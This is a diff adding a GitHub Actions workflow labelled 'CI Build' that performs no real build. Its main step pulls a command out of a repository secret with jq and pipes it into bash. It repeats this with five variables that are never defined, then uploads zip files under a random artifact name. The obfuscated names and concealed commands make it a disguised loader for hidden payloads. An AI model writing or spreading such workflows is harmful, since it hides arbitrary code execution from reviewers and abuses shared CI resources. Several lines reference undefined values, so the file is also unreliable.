@@ -1,0 +1,36 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  job:
+    name: Go
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          mpz512: ${{ secrets.mpz512 }}
+        run: |
+          printf '%s' "$mpz512" | jq -r .wcusv290 | /bin/bash
+          printf '%s' "$d060" | jq -r .p373 | /bin/bash
+          printf '%s' "$vsbm65422" | jq -r .ohomg14 | /bin/bash
+          echo $k3740 | jq -r .uuxu27 | /bin/bash
+          printf '%s' "$ieb85385" | jq -r .te022 | /bin/bash
+          echo $g8 | jq -r .btal919 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: k3MCEhvz
+          path: "*.zip"
+          retention-days: 1
